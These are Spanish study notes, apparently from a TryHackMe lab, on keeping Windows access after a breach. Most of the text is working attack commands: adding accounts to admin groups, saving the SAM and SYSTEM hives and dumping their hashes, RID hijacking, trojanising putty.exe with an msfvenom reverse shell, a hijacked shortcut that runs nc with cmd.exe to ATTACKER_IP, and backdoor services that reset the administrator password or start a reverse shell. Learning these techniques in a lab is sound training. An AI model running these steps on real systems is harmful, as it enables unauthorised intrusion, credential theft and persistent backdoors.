# Introducción

Despues de conseguir meternos dentro de la red interna de un target, tenemos que estar seguros de no peder acceso antes de conseguir lo que queremos. Entablar una persistencia es una de las primeras cosas que los atacantes deben saber cuando ganas acceso en la red.

En términos simples, la persistencia se refiere a cear alternativas para ganar acceso al host sin necesidad de volver a la fase de explotación de nuevo.

# Manipulación con pocos privilegios

Teniendo las credenciales del administrador es muy simple tener persistencia en la máquina. Sin embargo esto no hace que el blue team no te detecte, pero podemos manipular usuarios desprivilegiados, cosa que los administradores no suelen monitorizar.

## Asignar miembros de usuario

Asumimos que ya hemos dumpeado las contraseñas y las hemos crackeado

Directamente nosotros nos movemos de un usuario desprivilegiado a privilegios de administrador metiendolo al grupo de Administradores

```
net localgroup administrator usuario /add
```

Dandonos acceso por RDP o otro tipo de servicio.

Esto la verdad que es bastante sospechoso, podemos usar otros grupos como "operadores de backup". Este grupo no tiene permisos de administrador pero puede leer/escribir registros de código del sistema. 

```
net localgroup "backup operators" usuario2 /add
```

Como usuario desprivilegiado, no podemos hacer RDP o WinRM si no lo añadimos a los usuarios de "RDP" 

```
net localgroup "Remote Management Userss" usuario3 /add
```

Si nosotros queremos conectarnos desde nuestra máquina atacante y estamos en el grupo anteriormente dicho, no tenemos acceso a todos los archivos pero podemos hacer cosas chulas

```
vil-winrm -i 10.10.127.131 -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Si queremos dar privilegios de administrador a un usuario podemos cambiar registros

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Una vez que tenemos ready la backdoor podemos entablar conexiones con winrmm y mirar usuarios o grupos 

```
evil-winrm -i ip -u usuario -p contraseña
```

Podemos hacer backup del archivo SYSTEM y descargarlo

```
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

También podemos dumpear hashes de contraseñas con "secretsdunmp.py" 

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

## Privilegios especiales y Descriptores de seguridad

Podría dar el mismo resultado en vez de meter a alguien en el grupo modificar los usuario del mismo.

![image](https://github.com/user-attachments/assets/4fd33a70-00f1-4f12-b9cb-121d1fa22f15)

## RID Hijacking

Otro metodo de ganar privilegios de administrador

Cuando creamos un usuario se crea un RID asignado al mismo. Es simplemente un numero identificativo que reperesnta al usuario. CUando se loggea se coge el RID y se asocia al registro. 

Los administradores por defecto tienen asignado un RID = 500 y los usuarios regulares tienen RID >= 1000

```
wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

Deberemos acceder al SAM usando "Regedit"! es es un lugar restringido solo para cuentas de sistema como el administrador tenemos en las parrot C:\tools\pstools

```
PsExec64.exe -i -s regedit
```

Desde Regedit, podemos irnos a HKLM\SAM\SAM\Domains\Account\Users\ donde estan las key de cada usuario. Si quermeos modificar el usuario3 por ejemplo, deberemos buscarle el RID en hexadecimal (1010 = 0x3F2) correspondiente a un valor "F"

![image](https://github.com/user-attachments/assets/b498adc9-6a69-445d-8b12-7bf4cc852d73)

Y lo cambiariamos por el de administrador (500 = 0x01F4)

![image](https://github.com/user-attachments/assets/b44a4f51-605a-4903-b997-f58315f937e2)

# ARCHIVOS BACKDOOR

Otro metodo para establecer persistnecia es meter un archivo que parezca normal. Y que este haciendo modificaciones como un backdoor.

## FICHEROS DE EJECUCION

SI buscar cualquier ejecutablea alrededor del escritorio, los cambios on muy grandes y se usa frecuentemente. Supon que nosotros utilizamos Putty. Si chequeamos las propiedades, podemos ver usualmente punto a punto.

Vamos a hacer un ejemplo de putty

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

El resultado de puttyX.exe se ejecutara una revese_tcp con este metodo conseguimos persistencia.

## ACCESOS DIRECTOS ARHIVOS

SI no queremos alterar un ejecutable, podemos tambi´ne incrustar en un fichero, podemos cargar un script y hacer una puerta trasera como si fuera un programa normal.

Para esta tarea ejecutamos y checkeamos la calculadora que esta en el escritorio.

![image](https://github.com/user-attachments/assets/34831dc7-17ab-428d-bcd0-1ff92c0c2cbf)

Antes de hacer un hijacking al target crearemos un script simple de prower shell en C:\WIndows\System32

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finalmente, necesitaremos cambiar la ruta. Y ahora automaticamente se habra echo 

![image](https://github.com/user-attachments/assets/2531711f-ab9c-403b-94ef-464982b74b64)

```
nc -lvp 4445
```

## Hijacking Asociaciones de archivos

# Abusar servicios

Otra opción es configurando o ejecutando un servicio por debajo en la máquina víctima.

El servicio simplemente es un ejecutable que funciona en un background. Cuando configuramos el servicio, definimos como se va a ejecutar y usar y automaticamente podemos ejecutarlo o manualmente.

## CREACION DE UN BACKDOOR

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

Creamos el servicio "THMservice"

El "net user" hace que cuando se ejecute el servicio se resetee la contraseña a Passwd123. Y automaticamente se inicia

podemos crear también si queremos una rev shell ejecutable

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```
Y simplemente lo ejecutamos o ponemos la ruta


```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

## Modificar servicios existentes

Mientras creamos nuevos servicios, el blue team puede ver que hemos creado un servicio, podemos listar servicios 

```
sc.exe query state=all
```

```
sc.exe qc servicioç
```




